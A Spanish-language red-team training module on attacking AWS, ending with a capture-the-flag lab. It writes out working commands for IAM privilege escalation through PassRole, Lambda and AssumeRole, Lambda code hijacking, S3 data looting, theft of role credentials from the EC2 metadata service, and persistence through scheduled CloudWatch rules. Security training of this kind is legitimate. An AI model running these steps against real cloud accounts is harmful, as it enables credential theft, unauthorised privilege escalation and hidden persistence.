# MCRTA – Módulo 3

# AWS Red Team Essentials

**Versión Markdown profesional**

---

## 1. Introducción al Módulo

AWS es el proveedor cloud más extendido del mundo y el ecosistema mejor documentado en materia de ofensiva.  
En el contexto Multi-Cloud Red Team Analyst (MCRTA), AWS suele ser el punto inicial del ataque porque:

- Existen más vectores de exposición comunes (buckets S3, IAM permissive, EC2 metadata).
    
- Las empresas usan frecuentemente AWS como núcleo de identidad y microservicios.
    
- Permite escaladas complejas encadenando Lambda, IMDS, STS y roles mal asignados.
    

En este módulo aprenderás a:

- Realizar enumeración ofensiva profunda en AWS.
    
- Identificar rutas reales de escalación de privilegios IAM.
    
- Explotar misconfiguraciones comunes en S3, EC2, Lambda y políticas IAM.
    
- Usar STS y PassRole para moverte entre roles.
    
- Capturar flags del laboratorio ofensivo para evaluarte.
    

---

## 2. Revisión Rápida: Identidad Actual en AWS

Antes de atacar, confirma tu identidad real en AWS:

```
aws sts get-caller-identity
```

Debes analizar:

- **UserID**
    
- **Account**
    
- **ARN**
    

Esto determina:

- Tu nivel actual de permisos.
    
- A qué tipo de recurso puedes saltar.
    
- Qué roles pueden estar disponibles.
    

---

## 3. Enumeración Ofensiva Profunda en IAM

IAM es el núcleo ofensivo de AWS.  
Tu objetivo: descubrir qué permisos tienes y cuáles te permiten saltar a niveles superiores.

### 3.1 Listar políticas administradas

```
aws iam list-policies
```

### 3.2 Listar permisos asociados a tu usuario o rol

```
aws iam list-attached-user-policies --user-name <USER>
```

```
aws iam list-attached-role-policies --role-name <ROLE>
```

### 3.3 Ver contenido de una política

```
aws iam get-policy-version \
  --policy-arn <ARN> \
  --version-id <VERSION>
```

### 3.4 Identificar comodines peligrosos

Un atacante busca estas claves:

```
"Effect": "Allow",
"Action": "*",
"Resource": "*"
```

O equivalentes:

```
"iam:PassRole"
"sts:AssumeRole"
"lambda:CreateFunction"
"s3:*"
```

Esto generalmente implica escalación casi inmediata.

---

## 4. Escalada de Privilegios IAM (Privilege Escalation)

AWS documenta rutas legítimas que, combinadas, generan vectores de ataque si no se gestionan bien.  
Aquí van los caminos ofensivos más frecuentes y verificables:

### 4.1 Abuso de PassRole → Lambda → Admin

Si posees **iam:PassRole** y permisos sobre Lambda:

```
aws lambda create-function \
  --function-name escalada \
  --runtime python3.9 \
  --role <ROLE_ADMIN> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip
```
Ejecución:

```
aws lambda invoke --function-name escalada out.txt
```

Resultado:  
Estás ejecutando código con un rol superior.

### 4.2 Abuso de AssumeRole (STS)

Si la política permite:

```
sts:AssumeRole
```

Listas roles disponibles:

```
aws iam list-roles | grep AssumeRole
```

Saltas al rol:

```
aws sts assume-role \
  --role-arn <ARN_ROLE> \
  --role-session-name pentest
```

Obtendrás credenciales temporales que pueden ser más privilegiadas que las originales.

### 4.3 Crear una política más permisiva

Si posees:

```
iam:CreatePolicy
iam:AttachRolePolicy
```

Puedes concederte permisos admin sin requerir acceso directo al administrador.

### 4.4 Abuso de UpdateFunctionCode (Lambda Hijacking)

Si puedes modificar código de Lambda:

```
aws lambda update-function-code \
  --function-name <FUNC> \
  --zip-file fileb://evil.zip
```

Si la lambda tiene rol privilegiado, tu código también lo tendrá.

---

## 5. Enumeración y Explotación de S3

S3 es históricamente la mayor fuente de filtración de datos cloud.

### 5.1 Enumerar buckets

```
aws s3 ls
```

### 5.2 Probar acceso a un bucket

```
aws s3 ls s3://<BUCKET>
```

### 5.3 Ver ACL del bucket

```
aws s3api get-bucket-acl --bucket <BUCKET>
```

Bandera de riesgo:

```
"Grantee": {
    "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
}
```

Esto significa acceso público.

### 5.4 Descargar contenido sensible

```
aws s3 sync s3://<BUCKET> ./loot
```

### 5.5 Policy que permite escritura no intencional

```
"Action": "s3:PutObject",
"Resource": "arn:aws:s3:::<BUCKET>/*"
```

Esto permite subir payloads, persistencia o backdoors.

---

## 6. EC2 Offensive Enumeration y Explotación del Metadata Service (IMDS)

Las instancias EC2 permiten acceso al servicio de metadatos, crítico para ofensiva y escalación.

### 6.1 Enumerar instancias EC2

```
aws ec2 describe-instances
```

### 6.2 Desde dentro de una instancia comprometida

Obtener metadatos:

```
curl http://169.254.169.254/latest/meta-data/
```

Obtener credenciales del rol asociado:

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Esto devuelve un rol → con credenciales temporales:

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

Información obtenida:

- AccessKeyId
    
- SecretAccessKey
    
- Token
    

Permite asumir roles superiores si están mal configurados.

---

## 7. Abuso de Lambda, CloudWatch y Otros Servicios

AWS tiene múltiples servicios que pueden usarse ofensivamente.

### 7.1 Enumerar Lambdas

```
aws lambda list-functions
```

### 7.2 Ver rol vinculado

```
aws lambda get-function --function-name <NAME>
```

### 7.3 Persistencia mediante CloudWatch Events

Crear una regla:

```
aws events put-rule \
  --name persistencia \
  --schedule-expression "rate(5 minutes)"
```

Asignarla a tu lambda:

```
aws events put-targets \
  --rule persistencia \
  --targets Id=1,Arn=<ARN_LAMBDA>
```

Esto ejecuta código automáticamente, incluso si usuarios borra tu acceso original.

---

## 8. Laboratorio Práctico del Módulo 3 (CTF AWS)

### Objetivos

Capturar 3 flags:

- Flag 1: Identificar un bucket S3 accesible públicamente.
    
- Flag 2: Encontrar una política IAM que permite privilege escalation.
    
- Flag 3: Obtener credenciales temporales desde EC2 metadata.
    

### Indicaciones del Lab

1. Enumerar buckets:
    

```
aws s3 ls
```

2. Enumerar políticas sospechosas:
    

```
aws iam list-policies --query 'Policies[?PolicyName!=null]'
```

3. Buscar PassRole:
    

```
aws iam list-roles | grep -i passrole
```

4. Explorar metadata:  
    En una EC2:
    

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Reglas del Lab

- No modificar recursos fuera del entorno designado.
    
- No ejecutar acciones destructivas.
    
- Documentar paso a paso.
    

---

## 9. Resumen Final del Módulo

En este módulo aprendiste:

- Cómo realizar enumeración ofensiva profunda en AWS.
    
- Cuáles son los vectores de escalación de privilegios más comunes y efectivos.
    
- Cómo explotar buckets S3, políticas IAM débiles y metadata EC2.
    
- Cómo abusar de Lambda y CloudWatch para persistencia ofensiva.
    
- Cómo capturar flags reales del entorno AWS simulado.